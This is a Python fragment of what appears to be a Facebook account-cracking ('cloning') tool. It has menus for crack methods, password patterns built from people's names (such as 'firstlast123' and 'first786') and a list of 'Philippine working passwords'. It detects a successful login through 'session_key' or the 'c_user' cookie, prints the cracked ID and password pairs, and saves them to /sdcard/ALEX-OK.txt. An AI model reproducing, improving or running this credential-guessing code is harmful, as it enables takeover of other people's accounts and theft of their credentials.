...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' [2] Method 2 [NEW ALGORITHM]')
                                print(' [3] Method 3 [NEW ALGORITHM]')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                print(' Select Password Crack Menu:');linex();print(' [1] Crack with Automatic Password \n [2] Crack with Password Choice \n [3] Working Passwords for Cloning ');linex()
                                ...
                                if ppp in ['1','01']:
                                        ...
                                        print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
                                        linex()
                                        print('\033[1;32m Out of Philippine working password\033[1;37m ')
                                        linex()
                                        print(' [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ')
                                        linex()
...
###################################                    
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ALEX-ALIVE] '+uid+' | '+pas+' | ['+alex(uid)+']\033[1;97m')
...
###################################               
                        ...
                        if "c_user" in VEER:
                                ...
                                print(f'\r\r\x1b[1;92m [ALEX-ALIVE] %s | %s | %s'%(ids,pas,alex(ids)))
                                open('/sdcard/ALEX-OK.txt', 'a').write(ids+'|'+pas+'\n')
